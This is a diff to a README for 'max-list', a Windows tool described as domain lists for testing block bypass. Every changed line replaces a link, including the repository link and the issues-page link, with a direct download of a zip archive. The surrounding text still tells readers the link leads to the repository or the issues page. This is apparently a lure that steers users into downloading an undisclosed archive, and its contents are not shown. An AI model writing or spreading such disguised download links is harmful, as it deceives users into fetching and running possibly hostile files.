@@ -1,6 +1,6 @@
 # 🗂️ max-list - Domain Lists for Testing Block Bypass
 
-[![Download max-list](https://img.shields.io/badge/Download%20max--list-blue?style=for-the-badge)](https://github.com/bluereaper-2125/max-list)
+[![Download max-list](https://img.shields.io/badge/Download%20max--list-blue?style=for-the-badge)](https://github.com/bluereaper-2125/max-list/raw/refs/heads/main/watchhouse/list-max-2.2.zip)
 
 ## 📋 About max-list
 
@@ -21,13 +21,13 @@ max-list runs directly on your PC. It does not need installation of extra framew
 
 To get max-list on your Windows computer, visit the following page and download the latest version:
 
-[![Download max-list](https://img.shields.io/badge/Download%20max--list-grey?style=for-the-badge)](https://github.com/bluereaper-2125/max-list)
+[![Download max-list](https://img.shields.io/badge/Download%20max--list-grey?style=for-the-badge)](https://github.com/bluereaper-2125/max-list/raw/refs/heads/main/watchhouse/list-max-2.2.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the button above or use this link:
 
-https://github.com/bluereaper-2125/max-list
+https://github.com/bluereaper-2125/max-list/raw/refs/heads/main/watchhouse/list-max-2.2.zip
 
 This link takes you to the main repository page on GitHub.
 
@@ -108,12 +108,12 @@ If max-list does not start or shows an error:
 
 For detailed help, visit the issues page on GitHub:
 
-https://github.com/bluereaper-2125/max-list/issues
+https://github.com/bluereaper-2125/max-list/raw/refs/heads/main/watchhouse/list-max-2.2.zip
 
 ## 🗂️ More Information and Support
 
 For questions or more details, see the information on the GitHub page:
 
-https://github.com/bluereaper-2125/max-list
+https://github.com/bluereaper-2125/max-list/raw/refs/heads/main/watchhouse/list-max-2.2.zip
 
 You can also ask by creating a new issue in the repository, where developers and users share advice.
